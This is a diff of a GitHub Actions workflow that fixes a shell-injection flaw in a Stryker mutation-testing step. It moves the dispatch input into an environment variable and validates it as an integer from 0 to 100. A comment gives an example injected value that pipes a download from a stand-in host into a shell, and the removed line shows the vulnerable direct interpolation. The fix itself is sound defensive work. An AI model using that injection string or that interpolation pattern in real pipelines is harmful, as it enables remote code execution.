@@ -65,8 +65,32 @@ jobs:
       - name: verify the pre-registered E10 scope
         run: npx vitest run tests/unit/experiments/mutationScope.test.ts
 
+      # The threshold override arrives from `workflow_dispatch` input, which is
+      # attacker-controllable `github` context data. Interpolating `${{ ... }}`
+      # directly into a `run:` block splices it into the shell command before the
+      # shell ever sees it, so `1; curl evil.sh | sh` would execute — semgrep's
+      # run-shell-injection rule, and the first version of this workflow had
+      # exactly that. Passing it through `env:` puts the value in the process
+      # environment instead, where the shell treats it as data.
+      #
+      # It is also validated: Stryker takes a 0-100 number, so anything else is a
+      # mistake worth failing on rather than passing through.
       - name: run mutation testing
-        run: npx stryker run ${{ inputs.break_threshold && format('--thresholds.break {0}', inputs.break_threshold) || '' }}
+        env:
+          BREAK_THRESHOLD: ${{ inputs.break_threshold }}
+        run: |
+          set -euo pipefail
+          if [ -n "${BREAK_THRESHOLD:-}" ]; then
+            case "$BREAK_THRESHOLD" in
+              ''|*[!0-9]*) echo "break_threshold must be an integer 0-100, got: $BREAK_THRESHOLD" >&2; exit 1 ;;
+            esac
+            if [ "$BREAK_THRESHOLD" -gt 100 ]; then
+              echo "break_threshold must be <= 100, got: $BREAK_THRESHOLD" >&2; exit 1
+            fi
+            npx stryker run --thresholds.break "$BREAK_THRESHOLD"
+          else
+            npx stryker run
+          fi
 
       # Runs even when the threshold breaks, because the survivor list is the
       # actionable output and a failed threshold is exactly when it is wanted.
